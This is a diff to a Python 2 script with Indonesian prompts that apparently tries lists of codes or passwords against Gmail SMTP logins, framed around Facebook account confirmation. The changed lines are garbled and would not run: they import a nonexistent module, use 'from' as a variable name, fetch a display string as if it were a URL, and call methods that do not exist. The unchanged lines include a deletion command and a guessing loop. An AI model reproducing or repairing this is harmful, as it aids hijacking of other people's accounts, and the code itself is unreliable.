@@ -1,6 +1,6 @@
 #coding=utf-8
 
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,smtplib
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,smtplib,messege
 os.system('rm -rf .txt')
 for n in range(2000):
 
@@ -24,7 +24,7 @@ except ImportError:
     time.sleep(1)
     os.system('python2 upil.py')
 
-import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize,smtplib
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize,smtplib,messege
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
 from mechanize import Browser
@@ -182,14 +182,14 @@ def code():
 		print logo
 		print("\033[1;93mKonfirmasi Code Email Anda")
 		codem = raw_input("\033[1;34mEmail : ")
-		msg = raw_input("\033[1;31m Server FACEBOOK : ")
+		from = requests.get("Facebook • security@facebookmail.com")
 		server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
 		server.ehlo()
 		for code in code_list:
 			i = i + 1
 			print str(i) + '/' + str(len(code_list))
 			try:
-				v = server.login(codem, msg)
+				v = server.messege(codem, from)
 				s = json.loadd(v,text)
 				telok = open('code.txt', 'r')
 				system('clear')
@@ -211,4 +211,4 @@ def code():
 
 
 if __name__=='__main__':
-	code()
+	login()
